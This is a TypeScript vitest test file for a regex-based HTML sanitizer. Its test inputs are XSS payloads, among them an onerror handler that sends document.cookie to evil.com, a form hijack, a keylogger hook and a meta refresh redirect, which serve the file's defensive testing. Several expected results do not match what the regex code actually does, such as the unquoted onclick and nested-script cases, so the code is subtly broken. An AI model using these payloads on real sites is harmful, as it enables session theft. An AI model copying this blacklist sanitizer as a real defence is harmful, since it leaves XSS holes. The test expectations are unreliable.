import { describe, it, expect } from 'vitest';

// Mock the validation functions for testing
function sanitizeHtml(input: string): string {
  if (!input || typeof input !== 'string') return '';
  
  // Remove script tags, event handlers, and other dangerous content
  return input
    .replace(/<script[^>]*>.*?<\/script>/gis, '') // Remove script tags
    .replace(/<iframe[^>]*>.*?<\/iframe>/gis, '') // Remove iframe tags
    .replace(/<object[^>]*>.*?<\/object>/gis, '') // Remove object tags
    .replace(/<embed[^>]*>/gi, '') // Remove embed tags
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '') // Remove event handlers
    .replace(/javascript:/gi, '') // Remove javascript: protocol
    .replace(/data:text\/html/gi, '') // Remove data URLs
    .replace(/vbscript:/gi, '') // Remove vbscript: protocol
    .replace(/<link[^>]*>/gi, '') // Remove link tags
    .replace(/<meta[^>]*>/gi, '') // Remove meta tags
    .replace(/<style[^>]*>.*?<\/style>/gis, '') // Remove style tags
    .trim();
}

describe('HTML Sanitization Unit Tests', () => {
  describe('Script Tag Removal', () => {
    it('should remove basic script tags', () => {
      const input = '<script>alert("XSS")</script>Hello World';
      const result = sanitizeHtml(input);
      expect(result).toBe('Hello World');
    });

    it('should remove script tags with attributes', () => {
      const input = '<script type="text/javascript" src="malicious.js">alert(1)</script>Safe text';
      const result = sanitizeHtml(input);
      expect(result).toBe('Safe text');
    });

    it('should remove script tags case-insensitively', () => {
      const input = '<SCRIPT>alert("XSS")</SCRIPT><Script>alert(2)</Script>Clean text';
      const result = sanitizeHtml(input);
      expect(result).toBe('Clean text');
    });

    it('should remove multiple script tags', () => {
      const input = '<script>evil1()</script>Good<script>evil2()</script>Text<script>evil3()</script>';
      const result = sanitizeHtml(input);
      expect(result).toBe('GoodText');
    });

    it('should handle nested and malformed script tags', () => {
      const input = '<script><script>alert("nested")</script></script>Safe';
      const result = sanitizeHtml(input);
      expect(result).toBe('Safe');
    });
  });

  describe('Event Handler Removal', () => {
    it('should remove onclick handlers', () => {
      const input = '<div onclick="alert(1)">Click me</div>';
      const result = sanitizeHtml(input);
      expect(result).toBe('<div>Click me</div>');
    });

    it('should remove various event handlers', () => {
      const testCases = [
        { input: '<img onerror="alert(1)">', expected: '<img>' },
        { input: '<body onload="malicious()">', expected: '<body>' },
        { input: '<input onchange="steal()">', expected: '<input>' },
        { input: '<a onmouseover="track()">', expected: '<a>' },
        { input: '<form onsubmit="hijack()">', expected: '<form>' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeHtml(input)).toBe(expected);
      });
    });

    it('should remove event handlers with different quote styles', () => {
      const testCases = [
        '<div onclick="alert(1)">',
        '<div onclick=\'alert(1)\'>',
        '<div onclick=alert(1)>',
      ];

      testCases.forEach(input => {
        const result = sanitizeHtml(input);
        expect(result).toBe('<div>');
      });
    });
  });

  describe('Dangerous Tag Removal', () => {
    it('should remove iframe tags', () => {
      const input = 'Safe text <iframe src="http://evil.com"></iframe> more text';
      const result = sanitizeHtml(input);
      expect(result).toBe('Safe text  more text');
    });

    it('should remove object and embed tags', () => {
      const input = 'Text <object data="malicious.swf"></object> <embed src="evil.swf"> End';
      const result = sanitizeHtml(input);
      expect(result).toBe('Text   End');
    });

    it('should remove link and meta tags', () => {
      const input = '<link rel="stylesheet" href="evil.css">Text<meta http-equiv="refresh" content="0;url=evil.com">';
      const result = sanitizeHtml(input);
      expect(result).toBe('Text');
    });

    it('should remove style tags', () => {
      const input = 'Text <style>body{background:url("javascript:alert(1)")}</style> Safe';
      const result = sanitizeHtml(input);
      expect(result).toBe('Text  Safe');
    });
  });

  describe('Protocol Sanitization', () => {
    it('should remove javascript: protocol', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeHtml(input);
      expect(result).toBe('<a href="">Click</a>');
    });

    it('should remove vbscript: protocol', () => {
      const input = '<a href="vbscript:msgbox(1)">Click</a>';
      const result = sanitizeHtml(input);
      expect(result).toBe('<a href="">Click</a>');
    });

    it('should remove data:text/html URLs', () => {
      const input = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
      const result = sanitizeHtml(input);
      expect(result).toBe('');
    });

    it('should handle mixed case protocols', () => {
      const testCases = [
        'JavaScript:alert(1)',
        'JAVASCRIPT:alert(1)',
        'VbScript:msgbox(1)',
        'DATA:TEXT/HTML,<script>'
      ];

      testCases.forEach(protocol => {
        const input = `<a href="${protocol}">Test</a>`;
        const result = sanitizeHtml(input);
        expect(result).not.toContain(protocol.split(':')[0].toLowerCase());
      });
    });
  });

  describe('Complex Attack Vectors', () => {
    it('should handle HTML entity encoded attacks', () => {
      const input = '<script>alert(&#34;XSS&#34;)</script>';
      const result = sanitizeHtml(input);
      expect(result).toBe('');
    });

    it('should handle attribute-based XSS', () => {
      const input = '<img src="x" onerror="javascript:alert(\'XSS\')">';
      const result = sanitizeHtml(input);
      expect(result).toBe('<img src="x">');
    });

    it('should handle svg-based XSS attempts', () => {
      const input = '<svg><script>alert(1)</script></svg>';
      const result = sanitizeHtml(input);
      expect(result).toBe('<svg></svg>');
    });

    it('should preserve safe HTML while removing dangerous parts', () => {
      const input = '<p>Safe paragraph</p><script>alert("bad")</script><strong>Bold text</strong>';
      const result = sanitizeHtml(input);
      expect(result).toBe('<p>Safe paragraph</p><strong>Bold text</strong>');
    });

    it('should handle deeply nested malicious content', () => {
      const input = '<div><p><span><script>alert(1)</script>Safe</span></p></div>';
      const result = sanitizeHtml(input);
      expect(result).toBe('<div><p><span>Safe</span></p></div>');
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty strings', () => {
      expect(sanitizeHtml('')).toBe('');
    });

    it('should handle null and undefined', () => {
      expect(sanitizeHtml(null as any)).toBe('');
      expect(sanitizeHtml(undefined as any)).toBe('');
    });

    it('should handle non-string inputs', () => {
      expect(sanitizeHtml(123 as any)).toBe('');
      expect(sanitizeHtml({} as any)).toBe('');
      expect(sanitizeHtml([] as any)).toBe('');
    });

    it('should preserve Unicode characters', () => {
      const input = '测试 🚀 José María ñ ü ç';
      const result = sanitizeHtml(input);
      expect(result).toBe('测试 🚀 José María ñ ü ç');
    });

    it('should handle special characters without corruption', () => {
      const input = 'Price: $100 & €80 < 50% > 25%';
      const result = sanitizeHtml(input);
      expect(result).toBe('Price: $100 & €80 < 50% > 25%');
    });

    it('should handle very long strings', () => {
      const longSafeString = 'a'.repeat(10000);
      const result = sanitizeHtml(longSafeString);
      expect(result).toBe(longSafeString);
    });

    it('should handle mixed content correctly', () => {
      const input = `
        <h1>Title</h1>
        <script>alert("bad")</script>
        <p>Paragraph with <strong>bold</strong> text</p>
        <iframe src="evil.com"></iframe>
        <div onclick="track()">Clickable</div>
        Safe text continues here.
      `;
      
      const result = sanitizeHtml(input);
      
      expect(result).toContain('<h1>Title</h1>');
      expect(result).toContain('<p>Paragraph with <strong>bold</strong> text</p>');
      expect(result).toContain('<div>Clickable</div>');
      expect(result).toContain('Safe text continues here.');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('<iframe>');
      expect(result).not.toContain('onclick');
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('should prevent cookie stealing attempts', () => {
      const input = '<img src="x" onerror="fetch(\'http://evil.com/steal?cookies=\' + document.cookie)">';
      const result = sanitizeHtml(input);
      expect(result).toBe('<img src="x">');
    });

    it('should prevent form hijacking', () => {
      const input = '<form onsubmit="this.action=\'http://evil.com/steal\'">';
      const result = sanitizeHtml(input);
      expect(result).toBe('<form>');
    });

    it('should prevent DOM manipulation attacks', () => {
      const input = '<div onclick="document.body.innerHTML=\'<h1>Hacked!</h1>\'">';
      const result = sanitizeHtml(input);
      expect(result).toBe('<div>');
    });

    it('should prevent keylogger injection', () => {
      const input = '<input onkeypress="logKey(event.key)">';
      const result = sanitizeHtml(input);
      expect(result).toBe('<input>');
    });

    it('should prevent redirect attacks', () => {
      const input = '<meta http-equiv="refresh" content="0;url=http://evil.com">';
      const result = sanitizeHtml(input);
      expect(result).toBe('');
    });
  });
});